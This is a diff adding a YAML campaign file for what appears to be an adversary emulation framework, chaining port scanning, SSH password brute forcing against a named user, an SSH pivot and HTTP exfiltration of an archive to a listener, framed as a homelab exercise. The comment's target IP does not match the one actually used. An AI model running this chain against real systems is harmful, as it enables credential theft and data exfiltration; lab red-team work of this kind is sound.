@@ -1,0 +1,38 @@
+# campaigns/homelab_assessment.yaml
+#
+# A full-chain adversary emulation campaign against a single-host
+# homelab target (e.g. a DVWA container).
+#
+# Stage flow:
+#   Recon → Credential Access → Lateral Movement → Exfiltration
+#
+# Replace 192.168.1.50 with your actual lab target IP.
+
+campaign: homelab_assessment
+
+stages:
+  - module: reconnaissance.port_scan:PortScan
+    params:
+      target: "192.168.0.115"
+      port_range: "1-1024"
+      timeout: 0.5
+
+  - module: credential_access.ssh_brute:SSHBruteForce
+    params:
+      target: "192.168.0.115"
+      port: 22
+      username: "fareed"
+      wordlist: "wordlists/passwords.txt"
+      stop_on_first: true
+    continue_on_failure: false  # no point pivoting if we have no creds
+
+  - module: lateral_movement.ssh_pivot:SSHPivot
+    params:
+      target: "192.168.0.115"
+      port: 22
+      probe_command: "id && hostname && uname -a"
+
+  - module: exfiltration.http_exfil:HTTPExfil
+    params:
+      listener_url: "http://192.168.0.115:8080/upload"
+      archive_name: "collected.zip"
